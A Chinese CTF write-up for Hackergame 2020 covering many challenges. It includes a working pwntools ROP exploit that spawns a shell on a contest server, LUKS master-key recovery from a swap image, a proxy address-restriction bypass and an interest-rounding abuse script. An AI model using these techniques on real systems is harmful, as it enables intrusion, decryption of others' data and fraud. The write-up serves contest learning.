# Writeup

分享一下自己的做题经历及踩的坑

## 签到

看到url是 http://202.38.93.111:10000/?number=0 ，顺手改成number=1就ok了

## 猫咪问答++

2： Google搜索 “信鸽网络 mtu”， 第一条就是 “以鸟类为载体的网际协议”，进一步找到 https://tools.ietf.org/html/rfc1149  ，答案是256毫克  
3和5：搜索“中国科学技术大学第六届信息安全大赛”，找到了https://news.ustclug.org网站，按时间翻两篇文章就是答案： https://news.ustclug.org/2019/09/2019-sfd-ustc/ 和 https://news.ustclug.org/2019/12/hackergame-2019/  
4：百度全景地图  
1：完全没想到还能爆破……老老实实查完了所有动物（还被章鱼猫坑了好久）  
```
Docker：鲸鱼 +1 1
Golang：囊地鼠 +1 2
Python：蟒蛇
Plan 9：兔子 +1 3
PHP：大象 +1 4
GNU：角马 +1 5
LLVM：龙
Swift：燕子
Perl：骆驼 +1 6
GitHub：章鱼猫 +1 7 （争议？）
TortoiseSVN：乌龟
FireFox：小熊猫（red panda） +1 8
MySQL：海豚 +1 9
PostgreSQL：大象 +1 10
MariaDB：海豹 +1 11
Linux：企鹅
OpenBSD：河豚
FreeDOS：鱼
Apache Tomcat：猫 +1 12
Squid：鱿鱼
openSUSE：变色龙
Kali：龙
Xfce：老鼠 +1 13
```

## 2048

游戏残绝对不考虑以通关的方式拿flag

查看，http://202.38.93.111:10005/index.html   
有注释：
```
  <!-- 
    changelog:
    - 2020/10/31 getflxg @ static/js/html_actuator.js
  -->
```
继续：http://202.38.93.111:10005/static/js/html_actuator.js
```
  var type    = won ? "game-won" : "game-over";
  var message = won ? "FLXG 大成功！" : "FLXG 永不放弃！";

  var url;
  if (won) {
    url = "/getflxg?my_favorite_fruit=" + ('b'+'a'+ +'a'+'a').toLowerCase();
  } else {
    url = "/getflxg?my_favorite_fruit=";
  }
```

获得flag：  
http://202.38.93.111:10005/getflxg?my_favorite_fruit=banana


## 一闪而过的flag

先开cmd，再在里面运行程序  
（日常把“在此处打开命令窗口”放在右键里）  
（之后拖进ida逆了一下，flag是在代码里赋值的而不是放在全局变量，防止strings偷鸡，好评）  

## 从零开始的记账工具人

做题时间和难度严重不成比例

数字转大写的库搜到一大坨，反向的竟然一个没找到  
（本来是有cn2an的，可是为什么没找到呢）  

在 https://blog.csdn.net/tsxylhs/article/details/108683738 找到一个java的实现，改成Python  
（“拾”既能作数字又能作单位很麻烦）  
最后的答案死活不对，只能再写一个正向转换进行验证，然后手动修正  
（调代码前前后后至少两个小时，手算大概早搞定了）  

```python
def cnyton(s):
    map1 = {'壹': 1.0, '贰':2.0, '叁':3.0, '肆':4.0, '伍':5.0,
            '陆': 6.0, '柒':7.0, '捌': 8.0, '玖': 9.0}
    map2 = {'佰': 100, '拾': 10.0, '元': 1.0, '角': 0.1, '分': 0.01}

    total = 0
    tmp = 1
    for c in s:
        if map1.__contains__(c):
            tmp = map1[c]
        elif map2.__contains__(c):
            total += tmp * map2[c]
            tmp = 0
        else:
            pass
            #print(s, c, ord(c))
            #assert(0)
    return total

def ntocny(n):
    table1 = ['零', '壹', '贰', '叁', '肆', '伍',
            '陆', '柒', '捌', '玖']
    a = int(n/10+0.0001) % 10
    b = int(n+0.0001) % 10
    c = int(n*10+0.0001) % 10
    d = int(n*100+0.0001) % 10
    s = ""
    s += '' if a==0 else '拾' if a==1 else table1[a]+'拾'
    s += '' if b==0 and a==0 else '元' if b==0 and a!=0 else table1[b]+'元'
    s += '' if c==0 and d==0 else '零' if c ==0 and d != 0 and (a!=0 or b!=0) else table1[c]+'角'
    s += '' if d==0 else table1[d]+'分'
    s += '整' if c==0 and d==0 and (a!=0 or b!=0) else ''
    return s

with open("bills.csv", "r", encoding='utf8') as f:
    lines = f.readlines()

final = 0
for line in lines:
    s,c = line.split(',')
    s = s.strip()
    c = int(c)
    n = cnyton(s)
    check = ntocny(n)
    if s != check:
        print(s, check, n, c)
    final += n * c

print(final)
```

## 超简单世界模拟器

第一问从wiki抄了一个太空船  

第二问思路开始跑偏（wiki里竟然没有无限扩散的例子），自知没有能力手动构造，尝试用z3找解  
从 https://www.kaggle.com/jamesmcguigan/game-of-life-z3-constraint-satisfaction/ 找到了康威生命游戏的约束：（学到了AtLeast和AtMost的用法）  
```
                # dead   + 3 neighbours   = lives
                # living + 2-3 neighbours = lives
                cell == z3.And([
                    z3.AtLeast( past_cell, *past_neighbours, 3 ),
                    z3.AtMost(             *past_neighbours, 3 ),
                ])
```

实现之后挂机一晚上无解（我觉得相当大的可能是代码写的有bug）

fuzz无敌！（几分钟的时间，大约50万次尝试就成功了）
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

char map[52][52];
char tmpmap[52][52];

unsigned int seed;

void showmap(char map[][52]) {
	int i;
	int j;
	for(i = 1; i <= 50; i++) {
		for(j = 1; j <= 50; j++) {
			printf("%d", map[i][j]);
		}
		printf("\n");
	}
	printf("\n");
}

int try(void) {
	int i;
	int j;

	memset(map, 0, 52*52);
	map[6][46] = 1;
	map[6][47] = 1;
	map[7][46] = 1;
	map[7][47] = 1;
	map[26][46] = 1;
	map[26][47] = 1;
	map[27][46] = 1;
	map[27][47] = 1;

	seed = time(NULL);
	srand(seed);
	for(i = 1; i <= 15; i++) {
		for(j = 1; j <= 15; j++) {
			map[i][j] = rand() & 1;
		}
	}

	int turn;
	for(turn = 1; turn <= 200; turn++) {
		//system("clear");
		//showmap(map);
		for(i = 1; i <= 50; i++) {
			for(j = 1; j <= 50; j++) {
				char neighbours = map[i-1][j-1]+ map[i-1][j]+ map[i-1][j+1]   +map[i][j-1] +  map[i][j+1] +   map[i+1][j-1]+  map[i+1][j]+  map[i+1][j+1];
				tmpmap[i][j] = (neighbours <= 3) && (map[i][j]+neighbours >= 3);
			}
		}
		memcpy(map, tmpmap, 52*52);    // 这里的memcpy可以优化掉，既然代码能跑就不改了
		//printf("turn: %d\n", turn);
	}

	if (map[6][46] == 0 && map[6][47] == 0 && map[7][46] == 0 && map[7][47] == 0 && map[26][46] == 0 && map[26][47] == 0 && map[27][46] == 0 && map[27][47] == 0) {
	//if (map[6][46] == 0 && map[6][47] == 0 && map[7][46] == 0 && map[7][47] == 0) {
		return 1;
	}

	return 0;
}

int main(void) {
	int i;
	int j;
	int trycount = 0;
	while(!try()) {
		trycount++;
		if ((trycount % 1000) == 0) {
			printf("trycount: %d\n", trycount);
		}
	}
	printf("%d\n", seed);

	srand(seed);
	for(i = 1; i <= 15; i++) {
		for(j = 1; j <= 15; j++) {
			printf("%d", rand() & 1);
		}
		printf("\n");
	}
	printf("\n");
	showmap(map);
	return 0;
}
```

## 从零开始的火星文生活

对Misc一直有点恐惧（脑洞不够大）  

开始想是不是某种古典加密，后来搜乱码文字找到了一些网页，才确认应该只是编码问题  

最后在 https://www.v2ex.com/t/421212 里找到了答案（第一次知道了latin1编码）  
```shell
cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8
```
```python
with open('gibberish_message.txt', 'rb') as f:
    s = f.read()
r = s.decode('utf8').encode('gbk').decode('utf8').encode('latin-1').decode('gbk')
print(r)
```

## 自复读的复读机

先是system("/bin/sh")拿shell，看到 flag仅root可读 + su降权，放弃偷鸡  

直接搜答案，  

）：Python 输出自身的 4 种写法  
https://zhuanlan.zhihu.com/p/34882073  

逆序：
```python
[s:="[s:={0}{1}{0},s:=s.format(chr(34), s), print(s[::-1],end={0}{0})]",s:=s.format(chr(34), s), print(s[::-1],end="")]
```
sha256:
```python
[s:="[s:={0}{1}{0},s:=s.format(chr(34), s), print(__import__({0}hashlib{0}).sha256(s.encode()).hexdigest(),end={0}{0})]",s:=s.format(chr(34), s), print(__import__("hashlib").sha256(s.encode()).hexdigest(),end="")]
```

共同模板（不需要exec）：（列表+赋值表达式，这样即使是eval(input())也可以）
```
[s:="<>",s:=s.format(chr(34), s), print(s,end="")]
```
其中<>填入字符串本身，双引号用format(chr(34))代替（个人认为原文里最巧妙的点）

## 233同学的字符串工具

（被刚结束不久的 某比赛 Python50题 虐过之后，整个人都好了）  

大写：（fuzz！）
```
>>> for i in range(128, 0x110000):
...     if chr(i).upper() in "FLAG":
...         print(i)
...
64258
>>> hex(64258)
'0xfb02'
>>> '\ufb02'.upper()
'FL'
```

utf7：
```
>>> base64.b64encode("flag".encode("utf-16be"))
'AGYAbABhAGc'
>>> b'+AGYAbABhAGc-'.decode("utf-7")
'flag'

+AGYAbABhAGc-
```

## 233同学的Docker

docker找回构建时被删除的文件  
https://www.cnblogs.com/zejin2008/p/13460498.html

sudo docker info

sudo docker history 8b8d3c8324c7/stringtool

sudo docker inspect 8b8d3c8324c7/stringtool

sudo cat /var/lib/docker/overlay2/296981dec45ce9a4d8da0e7dc11b848b130dd2c4f7f7c4ccdc34a6b7901caba7/diff/code/flag.txt


## 从零开始的HTTP连接 - 未做出

网上的垃圾文章害人不浅……想过直接socket编程，看到有说Linux的socket系列函数给端口0等价于让内核随机选端口，原来只有bind是这样，connect是可以接受0端口的
于是在 拦截并修改数据包 或 rawsocket直接构造数据包 的路上一去不复返  

常用的抓包工具都不能原地透明修改数据包，寄希望于内核的iptables

最先找到了这篇文章：
https://www.reddit.com/r/sysadmin/comments/2kbi1i/pretending_port_zero_is_a_normal_one/

iptables -t nat -A PREROUTING -p tcp --dport 0 -j REDIRECT --to-port 80  
iptables -t nat -A OUTPUT -p udp --dport 1234 -j DNAT --to-destination <destination>:0

在自己的vmware nat网络 Ubuntu 20.04 Linux 虚拟机里，先尝试了第二条命令（当时没注意到是udp……），提示0是无效端口，于是第一条命令也没试  
（原来无意中找到了服务端的部署命令，理论上对客户端应该也是生效的，与答案擦肩而过……）  


想到了CyBRICS Quals 2019的FakeTCP（反转字节序），找了通过rawsocket手动构造数据包的writeup：  
https://blog.bi0s.in/2019/07/25/Forensics/FakeTCP-CyBRICS-Quals-2019/  
看起来似乎是个可行的方向？  

继续乱找发现一个有意思的lab：  
Project 4: Raw Sockets（在rawsocket上实现链路层、ip层和tcp层，并最终打开网页）  
http://david.choffnes.com/classes/cs4700sp16/project4.php  
以及相关的实现：  
https://github.com/rahulbahal7/raw-tcp-ip-sockets  
https://github.com/chkpk/RawSocket  
https://github.com/vinayrp1/TCP-IP-implementation-using-RAW-sockets  
第一个项目魔改后能够成功请求任何非0端口的http服务，0端口仍然不行（究其原因，vmware的nat不支持0端口转发，当时略微想了下这个可能然后忽略了）  


Linux的网络协议栈是可以插入自己写的bpf过滤器的（貌似iptables就是这么实现的？）  
希望找到一个好用的原地透明修改数据包的用户态工具：内核把网络包转发给该工具，工具可以自定义修改数据包，然后再转发回内核，内核继续发包，且此过程对上层应用完全透明  
（求推荐）  

（socat用过不少，这次竟然没想起来它）  

（疑问，这题做出人数怎么这么多？）  

## 来自一教的图片 - 未做出

直言：体验最差的一道题（可能是因为没学过相关的课程，所以完全无从下手）  

搜索题目里加粗的“傅里叶光学”，得到的大多是透镜图和物理学公式，与本题毫无关系  
考虑了傅里叶变换，网上找到的大多是粗浅的介绍，而且示例的频谱图和题图相差太远，遂不考虑  
下载图片的文件名是4f_system_middle.bmp，因此找了很久4f系统的内容，有一篇“基于4f系统的光学图像加密与解密仿真教学”，里面的例图和本题图片几乎一样，但这篇文章讲的是图片加密，需要一张密钥图片  

（而且，这题做出人数怎么也这么多？？）  

## 超简陋的OpenGL小程序

不懂计算机图形学，最开始尝试逆向exe，太复杂了  
然后乱改fs和vs文件，发现vs文件改成gl_Position = projection \* view \* vec4(FragPos, 1.0+1.3)-3.0;可以勉强看到flag，再稍微猜一猜  
（然而还是不懂为什么这样改）  

## 生活在博弈树上

静态链接+没开pie+没去符号+给了源码  
（太幸福了）  

gets简单栈溢出，没有canary，无需泄露地址，rop两关一起梭  

```python
from pwn import *

def sendanswer(ans):
    global s
    s.sendlineafter("Your turn. Input like (x,y), such as (0,1):", ans)

pop_rdi_ret = 0x4017b6
pop_rdx_rsi_ret = 0x43fb99 
pop_rax_ret = 0x43e52c
syscall = 0x402bf4
gets = 0x409E00
buf = 0x4a8f00

ropchain = p64(pop_rdi_ret)+p64(buf)+p64(gets) \
    +p64(pop_rdi_ret)+p64(buf) \
    +p64(pop_rdx_rsi_ret)+p64(0)+p64(0) \
    +p64(pop_rax_ret)+p64(59) \
    +p64(syscall) 

#s = process("./tictactoe")
s = remote("202.38.93.111", 10141) ; s.sendlineafter("token", "<hide here>")

sendanswer("(1,1)")
sendanswer("(0,2)")
sendanswer("(1,0)")
sendanswer(b"(2,2)".ljust(128, b' ')+b' '*8+b'\0\0\0\0\0\0\0\1'+b' '*8+ropchain)
s.send('/bin/sh\0')

s.interactive()
```

## 来自未来的信笺 - 未做出

看到二维码立刻想到了GitHub北极项目，第一张图是META，第二张图是metadata，第三张图是空白，那么后面的图连起来应该是tar包（ https://github.com/github/archive-program/blob/master/GUIDE_zh.md ）  
用了pyzbar解二维码，没想到这个库不能正确处理二进制（网上大部分文章都推荐这个库，又是垃圾文章害人）  

## 狗狗银行

开始卡了几天，后来（看做出的人数不对劲）才发现算利息有四舍五入的问题，储蓄卡167元第二天可得1元利息，差不多0.6%，比贷款的0.5%高，可以薅羊毛  
开999张储蓄卡，每张存167元，不够的钱开一张信用卡借；每天结束，从每张储蓄卡提一元钱出来维持余额为167元，还掉信用卡的利息（保证每天欠款不多于上一天）  
大约每天能多140元，几分钟就好（网络交互好慢）  

（最开始用requests.port(data=data)发请求，始终不对，后来改用requests.port(json=data)才发现content-type请求头的问题，卡了很长时间……）  

```python
import requests
import json

def api(api, data):
    headers = {
        'Authorization': 'Bearer <token>'
    }
    #print(json.dumps(data))
    r = requests.post(f"http://202.38.93.111:10100/api/{api}", json=data, headers=headers)
    #print(r.status_code)
    #print(r.text)

def create(cardtype):    # debit  credit
    api("create", {"type":cardtype})

def eat(card):
    api("eat", {"account":card})

def transfer(src, dst, amount):
    api("transfer", {"src":src, "dst":dst, "amount":amount})


for i in range(2, 999+1):
    create("debit")

create("credit")
debit_amount = 167*999-1000
transfer(1000, 1, 167*999-1000)

for i in range(2, 999+1):
    transfer(1, i, 167)

while True:
    input()
    eat(1)
    for i in range(2, 999+1):
        transfer(i, 1, 1)
    transfer(1, 1000, int(debit_amount*0.005+10+0.5))
```

## 超基础的数理模拟器

wolfram alpha网页版有识图功能，苦于没有会员；手打公式发现计算结果精度不够  
（为了题目装一个wolfram mathematica也不值得）  

找到了自己初学Python时写的定积分计算器，想利用一下  
找LaTeX转Python表达式的库，竟然找不到……全是Python转LaTeX  
发现了一个LaTeX转SymPy的库，不过一心想着转Python就直接忽略了（完全没注意SymPy自己就可以算定积分）  

最后决定手动解析LaTeX：  
```python
import requests
import re
from math import *
import traceback

def fx(f,x):    #字符串型表达式的计算,s是表达式，x是自变量
    return eval(f)    #f在进入此函数之前要先经过compile，否则效率极低

def integral(f,a,b):    #f是表达式，a是积分下界，b是积分上界
    k=1000.0    #k是[a,b]区间分的总份数
    n=k/(b-a)    #n为一个长度为1的区间分割的份数
    
    s=fx(f,a)+fx(f,b)     #累加器
    
    maxrange=int(k)
    temp=0
    for i in range(1,maxrange):
        temp=temp+fx(f,a+i*1.0/n)
    s=s+2*temp

    temp=0
    for i in range(maxrange):
        temp=temp+fx(f,a+(i+0.5)/n)
    s=s+4*temp
        
    s=s/(6.0*n)
    return s


def split_to_tokens(raw_str):
    token_list = []
    char_list = list(raw_str)
    while (char_list):
        c = char_list.pop(0)
        tmp = ""
        if (c == '\\'):
            tmp += c
            while (True):
                c = char_list.pop(0)
                if (c.islower() or c == '_' or c == ','):
                    tmp += c
                else:
                    char_list.insert(0, c)
                    break
        elif (c.isdigit()):
            tmp += c
            while (True):
                c = char_list.pop(0)
                if (c.islower() or c == '_' or c == ','):
                    tmp += c
                else:
                    char_list.insert(0, c)
                    break
        elif (c in "{}()xe+-^"):
            tmp = c
        elif (c == " "):
            pass
        else:
            print(f"unknown char {c!r}")
            assert(0)
        if (tmp):
            token_list.append(tmp)
    return token_list

def tokens_to_pyexpress(token_list):    # notice token_list will be modified
    funcs = {r"\ln":"log", r"\sin":"sin", r"\cos":"cos", r"\tan":"tan", r"\arcsin":"asin", r"\arccos":"acos", r"\arctan":"atan",
             r"\sinh":"sinh", r"\cosh":"cosh", r"\tanh":"tanh", r"\arcsinh":"asinh", r"\arccosh":"acosh", r"\arctanh":"atanh"}
    funcs2 ={r"\sqrt":"sqrt", '^':"**"}
    converts = {r"\,":"*"}
    pyexpress = ""
    need_an_operator = False
    while (token_list):
        token = token_list.pop(0)
        #print(token)
        if (token.isdigit() or token in ['x', 'e']):
            if (need_an_operator):
                pyexpress += "*"
            pyexpress += token
            need_an_operator = True
        elif (token in ['+', '-']):
            pyexpress += token
            need_an_operator = False
        elif (token in converts):
            pyexpress += converts[token]
            need_an_operator = False
        elif (token in funcs):
            next_token = token_list.pop(0)
            assert(next_token == r'\left')
            next_token = token_list.pop(0)
            assert(next_token == '(')
            internal = tokens_to_pyexpress(token_list)
            next_token = token_list.pop(0)
            assert(next_token == r'\right')
            next_token = token_list.pop(0)
            assert(next_token == r')')
            if (need_an_operator):    #pyexpress and pyexpress[-1] in [')']):
                pyexpress += "*"
            pyexpress += funcs[token]+'('+internal+')'
            need_an_operator = True
        elif (token in funcs2):
            next_token = token_list.pop(0)
            assert(next_token == '{')
            internal = tokens_to_pyexpress(token_list)
            next_token = token_list.pop(0)
            assert(next_token == '}')
            if (need_an_operator and token != '^'):    # e**(x), no need to add an operator before **
                pyexpress += "*"
            pyexpress += funcs2[token]+'('+internal+')'
            need_an_operator = True
        elif (token == r"\frac"):
            next_token = token_list.pop(0)
            assert(next_token == '{')
            upp = tokens_to_pyexpress(token_list)
            next_token = token_list.pop(0)
            assert(next_token == '}')
            next_token = token_list.pop(0)
            assert(next_token == '{')
            downn = tokens_to_pyexpress(token_list)
            next_token = token_list.pop(0)
            assert(next_token == '}')
            if (need_an_operator):
                pyexpress += "*"
            pyexpress += "("+upp+")/("+downn+")"
            need_an_operator = True
        elif (token == r"\left"):
            next_token = token_list.pop(0)
            assert(next_token == '(')
            internal = tokens_to_pyexpress(token_list)
            next_token = token_list.pop(0)
            assert(next_token == r'\right')
            next_token = token_list.pop(0)
            assert(next_token == r')')
            if (need_an_operator):    #pyexpress and pyexpress[-1] in [')']):
                pyexpress += "*"
            pyexpress += '('+internal+')'
            need_an_operator = True
        elif (token == "{"):
            internal = tokens_to_pyexpress(token_list)
            next_token = token_list.pop(0)
            assert(next_token == '}')
            if (need_an_operator):    #pyexpress and pyexpress[-1] in [')']):
                pyexpress += "*"
            pyexpress += '('+internal+')'
            need_an_operator = True
        elif (token in ['}', ')', r"\right"]):
            token_list.insert(0, token)
            break
        else:
            print(f"unknow token: {token}")
            assert(0)
        #print(token, need_an_operator)
        #print(token_list)
        #print(pyexpress)
    return pyexpress
    


def parselatex(latex_str):
    tokenlist = split_to_tokens(latex_str)
    print(tokenlist)
    result = tokens_to_pyexpress(tokenlist)
    return result

def parse_definite_integral(raw_str):
    assert(raw_str.startswith(r'$\int_{'))
    assert(raw_str.endswith(r'\,{d x}$'))
    token_list = split_to_tokens(raw_str[len(r'$\int_{'):-len(r'\,{d x}$')])
    lowbound = eval(tokens_to_pyexpress(token_list))
    next_token = token_list.pop(0)
    assert(next_token == '}')
    next_token = token_list.pop(0)
    assert(next_token == '^')
    next_token = token_list.pop(0)
    assert(next_token == '{')
    highbound = eval(tokens_to_pyexpress(token_list))
    next_token = token_list.pop(0)
    assert(next_token == '}')
    next_token = token_list.pop(0)
    if (next_token != r'\,'):
        token_list.insert(0, next_token)
    pyexpress = tokens_to_pyexpress(token_list)
    return pyexpress, lowbound, highbound


def caculate_definite_integral(latex_str):
    f, a, b = parse_definite_integral(latex_str)
    print(f, a, b)
    return integral(compile(f, '', 'eval'), a, b)    # compile is very important


def double_to_final_answer(d):
    tmp = str(d)
    pos = tmp.find('.')
    return tmp[:pos+1+6]

"""
test = r'''$\int_{2}^{6} 2 \, \sqrt{x} \ln\left(x\right) + \frac{3}{2} \, x + \sqrt{x} + \frac{3}{x} - e^{\left(\frac{x^{2} + 1}{2 \, x}\right)} + \ln\left(x\right)\,{d x}$'''
#test = r''' 2 \, \sqrt{x} \ln\left(x\right) + \frac{3}{2} \, x + \sqrt{x} + \frac{3}{x} - e^{\left(\frac{x^{2} + 1}{2 \, x}\right)} + \ln\left(x\right)'''

test2 = r'''$\int_{\frac{4}{3}}^{8} \frac{7}{12} \, x + 2 \, \sqrt{x} - \frac{2}{\sqrt{x}} + \frac{3}{x} - \arctan\left(\sqrt{x} \ln\left(x\right)\right) + e^{\left(\frac{1}{4} \, x\right)} + \ln\left(x\right)\,{d x}$'''
#test2 = r'''\frac{7}{12} \, x + 2 \, \sqrt{x} - \frac{2}{\sqrt{x}} + \frac{3}{x} - \arctan\left(\sqrt{x} \ln\left(x\right)\right) + e^{\left(\frac{1}{4} \, x\right)} + \ln\left(x\right)'''

test3 = r'''$\int_{\frac{1}{4}}^{1} {\left(x \ln\left(x\right) + \ln\left(x\right)\right)} {\left(\sqrt{x} + \cos\left(\frac{4}{x}\right) + e^{\left(\frac{1}{3} \, x + \frac{3}{x}\right)} + \ln\left(x\right)\right)}\,{d x}$'''

r = parse_definite_integral(test)
print(r)
r = parse_definite_integral(test2)
print(r)
"""


# https://blog.csdn.net/weixin_42575020/article/details/95179840
initial_cookie_dict = {'session': '<hide here>'}

s = requests.Session()
#requests.utils.add_dict_to_cookiejar(s.cookies, initial_cookie_dict)

r = s.get("http://202.38.93.111:10190/", cookies=initial_cookie_dict)
restext = r.text

for i in range(400):
    try:
        print(i)
        level = re.findall(r'<h1 class="cover-heading"> (.*) 题</h1>', restext)[0]
        print(level)
        latex_str = re.findall(r"\$\\int_.*?\\,{d x}\$", restext)[0]
        print(latex_str)
        raw_ans = caculate_definite_integral(latex_str)
        ans = double_to_final_answer(raw_ans)
        print(ans)
    except Exception as e:
        ans = ""
        traceback.print_stack()
        pass
    
    r2 = s.post("http://202.38.93.111:10190/submit", data={"ans":ans})
    #print(r2.text)
    restext = r2.text
    #new_cookie = "=".join([f"{k}: {v}" for k,v in s.cookies.iteritems()])
    new_cookie = dict(s.cookies.iteritems())
    print(new_cookie)
```

bug百出，好在速度很快（解析秒出，算积分可以控制精度，大约不到1秒），正确率粗估只有2/3左右（主要是隐藏的乘号不好处理），不过做题足够了。平均1-2秒就能算对一个，脚本跑起来几分钟就解完了  

以及，基于Cookie的交互体验不好，requests.Session通过add_dict_to_cookiejar设置的Cookie貌似后面不会自动更新（？），而不初始化Cookie又无法开始第一道题  
后来尝试在第一次请求时临时指定Cookie，终于解决了问题（求requests.Session正确的用法）  

（然而调脚本花了几个小时，手按计算器多好）  

建议参考狗狗银行用Authorization头验证身份的方法，对交互很友好，不用考虑Cookie更新的问题  

## 永不溢出的计算器

输入 0 - 1 可以得到 n - 1  
（最开始没想到用负数，一直尝试给一个大数+0然后看是否等于自己判断是否小于n，还奇怪题目为什么不给nc）  
（虽然最后获得n的方法是给两个大正数+0，减去服务器返回值后gcd……）  

尝试各种方法分解n（factordb、yafu），以及常见的rsa攻击，无解  

后来注意到sqrt，稍作尝试发现是二次剩余  

参考 https://www.slidestalk.com/u229/cryptography1283267 分解n：  

c = flag ^ 65537   
让服务器计算 b = sqrt(c)  
p = gcd(c+b, n)  
q = n // p  


## 普通的身份认证器 - 未做出

（对Web题完全没有感觉，不知道从哪里下手）  

一直尝试从响应头判断后端框架，完全没看代码注释里给出了FastAPI  
看到了jwt，应该是要伪造jwt，就此卡住  

## 超精巧的数字论证器 - 未做出

直到比赛截至前几分钟才注意到~-x和-~x，然后想的是凑6个数相乘或5个数相乘再加一个数得到最终的数  
（预期解的秦九韶算法拆分很巧妙）  

## 超自动的开箱模拟器

看到brainfuck首先想到的是不久前刚结束的 某比赛 一道题 juan，要求用最短的brainfuck代码实现base64算法，且后做的人必须比前面的人更好才能得到flag  
出题人（不是本人）自己用了3.9w字符（c2bf的结果），结果一天时间卷王（也不是本人）搞出了785字符……（卷才是第一生产力？）  

曾看过一段介绍百囚徒问题的视频  
对本题，下一次开上一次箱子里的号码-1的箱子，只要最大的环不超过64就一定能成功  

起初尝试用c2bf（ https://github.com/benjojo/c2bf ）生成brainfuck：  
```
int target = read_char();
int box_key = 0;

while (1 == 1) {
        while (box_key > target - 1) {
                write_char(1);
                box_key = box_key - 1;
        }
        while (box_key < target - 1) {
                write_char(2);
                box_key = box_key + 1;
        }
        write_char(3);
        target = read_char();
}
```
```
,>>+[>+>+<[->-<]+>[<->[-]]<[>+[<<<[>>>>+>+<<<<<-]>>>>>[<<<<<+>>>>>-]<<<<<<[>>>>>>+>+<<<<<<<-]>>>>>>>[<<<<<<<+>>>>>>>-]+[<->-]>+<<<[>>+<<-]>>[>-]>[><<<<+>[-]>>->]<+<<[>-[>-]>[><<<<+>[-]+>>->]<+<<-]>[-]>-<<<[>+<[-]]+>[<->-]<[>+.[-]<<<<<[>>>>>+>+<<<<<<-]>>>>>>[<<<<<<+>>>>>>-]+[<->-]<<<<<<[-]>>>>>[<<<<<+>>>>>-]<[-]<+>]<-]+[<<<[>>>>+>+<<<<<-]>>>>>[<<<<<+>>>>>-]<+<<<<<[>>>>>>+>+<<<<<<<-]>>>>>>>[<<<<<<<+>>>>>>>-]+[<->-]>+<<<[>>+<<-]>>[>-]>[><<<<+>[-]>>->]<+<<[>-[>-]>[><<<<+>[-]+>>->]<+<<-]>[-]>-<<<[>++.[-]<<<<<[>>>>>+>+<<<<<<-]>>>>>>[<<<<<<+>>>>>>-]+[<+>-]<<<<<<[-]>>>>>[<<<<<+>>>>>-]<[-]<+>]<-]+++.[-],<<<<[-]>>>>[<<<<+>>>>-]<[-]<+>]<-]
```

上服务器发现猜一次就要3-5秒，总是超时（还曾寄希望于随机出一组最大环很短的数据）  

后来手写：  
```
+++>++>+[>[-<.>]>,-[-<+<<.>>>]<<<<.>>]
```
等效的C代码：  
```
while (1) {
	while (box_key > 0) {
		box_key = box_key - 1;
		write_char(1);
	}
	target = read_char();
	target = target - 1;
	while (target > 0) {
		target = target - 1;
		box_key = box_key + 1;
		write_char(2);
	}
	write_char(3);
}
```

## 室友的加密硬盘

有幸找到了这篇文章，一步步照做就好  
https://blog.appsecco.com/breaking-full-disk-encryption-from-a-memory-dump-5a868c4fc81e  

losetup -P /dev/loopX roommates_disk_part.img （X是空闲的loop设备）  
然后dd if=/dev/loopXp5 of=swap.img bs=1G 和 dd if=/dev/loopXp6 of=encryptedhome.img bs=1G 提取交换分区和加密的主目录分区  

findaes swap.img > maybeaeskey.txt 扫描swap.img得到若干个aeskey  

按照文章，爆破主密钥：  
```
import hashlib

mk_salt = bytes.fromhex('2c bb 9f b3 82 57 38 d7 1a b2 19 a1 6e c1 d8 02 b5 f3 0e 04 9d 20 78 f0 9a a3 97 c2 2a cc 23 78'.replace(' ',''))   # 盐
aes_keys = []  # 可能的AES密钥
mk_digest = bytes.fromhex('3f 4f a6 43 ac ba 6f cc d6 50 67 fd 41 75 ba f8 5b c1 e4 7e'.replace(' ','')) #
mk_itera = 160000 # 

with open("maybeaeskey.txt", "r") as f:
    lines = f.readlines()

i = 2
while (i < len(lines)):
    aes_keys.append(bytes.fromhex(lines[i].strip().replace(' ','')))
    i += 2

print(len(aes_keys), len(aes_keys)**2)

trycount = 0
for aes_key in aes_keys:
    for aes_key2 in aes_keys:
        trycount += 1
        print(trycount)
        fullkey = aes_key + aes_key2
        x = hashlib.pbkdf2_hmac('sha1', fullkey, mk_salt, mk_itera, dklen=20)
        #assert(len(x) == len(mk_digest))
        #if binascii.hexlify(x).decode() == mk-digest:
        if (x == mk_digest):
            print(fullkey.hex())

# e4581675c3f947f7b537a3dd6098e4a5898b0a18c2b3b0f675c61de4106fc6a1fa01a98089a38f606c148694e7a3509aaccfc165068ed67f5715384b93e56aa6
```

重设密码：
cryptsetup luksAddKey encryptedhome.img --master-key-file <(echo 'e4581675c3f947f7b537a3dd6098e4a5898b0a18c2b3b0f675c61de4106fc6a1fa01a98089a38f606c148694e7a3509aaccfc165068ed67f5715384b93e56aa6' | xxd -r -p)  


映射分区：  
sudo cryptsetup luksOpen encryptedhome.img decryptedhome  

挂载：  
sudo mount /dev/mapper/decryptedhome mnt  

得到flag  

## 超简易的网盘服务器 - 未做出

web无力，没有任何思路  

## 超安全的代理服务器

由PUSH想到是http2，chrome F12搞了好久发现并不行  

查到curl的命令行不支持PUSH（libcurl是支持的）  

后来查到了nghttp，可以看到PUSH：
nghttp -vn https://146.56.228.227

（chrome主动访问PUSH链接后F12里才出现相应的内容）


做第二问的时候间隔时间有点长，把curl不支持PUSH记成了不支持http2  
一直想找Python的工具，hyper的坑极多，而且对代理的支持很不好  

最后又回到了curl，还支持给代理单独设请求头（找的几乎所有其他工具和库都不行）  

curl -vvv http://www.ustc.edu.cn.127.0.0.1.xip.name:8080/ --proxy-insecure --insecure --proxy https://146.56.228.227/ --proxytunnel --header "Referer: 146.56.228.227" --proxy-header "secret: $(python3 getsecret.py)"  

参数很坑，之前加了--http2-prior-knowledge总是不对  

（绕地址限制的方法应该是非预期；另外xip.io好像不支持http2）  


getsecret.py
```python
import re
import hyper
import ssl

sslcontext = ssl._create_unverified_context()
sslcontext.set_alpn_protocols(hyper.tls.SUPPORTED_NPN_PROTOCOLS)
#sslcontext = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH, cafile="./cert.pem")

conn = hyper.HTTP20Connection('146.56.228.227:443', enable_push=True, ssl_context=sslcontext)
#h2,h2-16,h2-15,h2-14,h2c

conn.connect()
conn.request("GET", "/")
resp = conn.get_response()
pushes = conn.get_pushes()
for push in pushes:
    #r = push.get_response()
    #print(r)
    secretpath = push.path

conn.request("GET", secretpath)
